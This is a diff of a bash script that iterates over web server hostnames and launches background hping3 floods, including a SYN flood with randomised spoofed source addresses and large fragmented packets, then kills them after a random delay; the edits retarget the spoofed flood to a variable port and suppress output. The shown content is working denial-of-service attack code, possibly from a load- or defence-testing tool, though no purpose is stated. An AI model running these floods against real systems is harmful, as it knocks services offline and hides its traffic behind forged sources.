@@ -102,7 +102,7 @@ do
             sudo hping3 ${sitefqdn[$i]} -p $port –SF --flood > /dev/null 2>&1 &
 
             echo -e "Running syn flood attack from random sources, towards a webserver \r\n "
-            sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 ${sitefqdn[$i]} > /dev/null 2>&1 &
+            sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport $port ${sitefqdn[$i]} > /dev/null 2>&1 &
 
             #echo -e "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
             #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 > /dev/null 2>&1 &
@@ -131,11 +131,11 @@ do
             #sudo ./gen_ab.sh $server_ip > /dev/null 2>&1 &
             
             r=`shuf -i 120-600 -n 1`;
-            perl -le "sleep rand $r" && sudo killall -9 hping3 &
-            perl -le "sleep rand $r" && sudo killall -9 nping &
+            perl -le "sleep rand $r" && sudo killall -9 hping3 > /dev/null 2>&1 &
+            perl -le "sleep rand $r" && sudo killall -9 nping > /dev/null 2>&1 &
 
         else
-                echo -e "SKIP ${sitefqdn[$i]} - $ip not answering on port 443 or 80"
+                echo -e "SKIP ${sitefqdn[$i]} - $ip not answering on port 443"
         fi
    fi
 done
